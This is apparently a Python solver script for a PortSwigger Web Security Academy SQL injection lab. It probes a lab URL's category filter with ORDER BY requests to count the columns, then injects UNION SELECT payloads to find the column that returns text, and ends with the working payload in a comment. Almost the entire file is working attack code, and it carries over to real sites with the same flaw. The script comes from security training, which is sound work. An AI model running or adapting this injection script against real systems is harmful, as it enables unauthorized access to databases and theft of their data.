import requests

burp0_url = "https://ac821fbf1fd82bf4c06937c200a60040.web-security-academy.net:443/filter?category=amotz"
burp0_cookies = {"session": "NkX2Vj6psnIfpVV2ukkOQ3H0AJdivAll"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #

# https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text


cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0
# table = "Accessories"
# columns = "description"
value = "'IWfxqs'"

def send_request_order_by(number: int):
    Payload = f"'+ORDER+BY+{number}--+-"
    url = burp0_url + Payload
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response)
    if response.status_code == 200:
        return True
    else:
        return False


def send_payload(number_of_columns, burp0_url):
    nulllist = [] #created list for NULL parameters
    for i in range(number_of_columns):
        nulllist.append('NULL') #populating the list with NULLs

    for ii in range(number_of_columns):
        nulllist[ii] = value #changing one of the NULL parameter in index ii to labs value
        payload_var = ",".join(nulllist)
        print(payload_var)
        sqli_payload = f"'+UNION+SELECT+{payload_var}--+-"
        loaded_url = str(burp0_url + sqli_payload)
        print(loaded_url)
        response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
        print(response)
        if response.status_code == 200:
            print(f"your payload is:{sqli_payload}")
            break
        nulllist[ii] = "NULL" #returnin the value in index ii back to NULL for further testing of other parameters




if __name__ == '__main__':
    for i in range(10, 0, -1):
        print(f"{i} try:")
        if send_request_order_by(i): #if functions is true:
            number_of_columns = i
            print(f"Stage 1 complete:\n number of columns to UNION BY:\n***   {i}    ***.\n starting Stage 2:\n")
            break
    send_payload(number_of_columns, burp0_url)





# PayLoad:
# '+UNION+SELECT+NULL,'IWfxqs',NULL--+-
